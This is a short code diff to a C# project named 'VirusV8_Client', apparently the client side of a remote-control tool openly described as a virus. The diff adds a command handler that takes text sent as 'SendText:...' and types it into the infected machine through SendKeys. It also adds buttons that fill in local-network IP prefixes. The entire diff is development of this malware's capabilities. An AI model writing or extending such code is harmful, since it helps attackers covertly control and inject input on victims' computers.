@@ -178,6 +178,20 @@ namespace VirusV8_Client
 
                         }
                     }
+
+                    if (something.Contains("SendText"))
+                    {
+                        //SendText:Text
+                        try
+                        {
+                            string[] Text = something.Split(':');
+                            SendKeys.Send(Text[1]);
+                        }
+                        catch
+                        {
+
+                        }
+                    }
                 }
                 catch (Exception EX)
                 {
@@ -214,6 +228,16 @@ namespace VirusV8_Client
             }
 
 
+        }
+
+        private void button192168178xx_Click(object sender, EventArgs e)
+        {
+            textBox1.Text = "192.168.178.";
+        }
+
+        private void button101000xx_Click(object sender, EventArgs e)
+        {
+            textBox1.Text = "10.100.0.";
         }
     }
 }
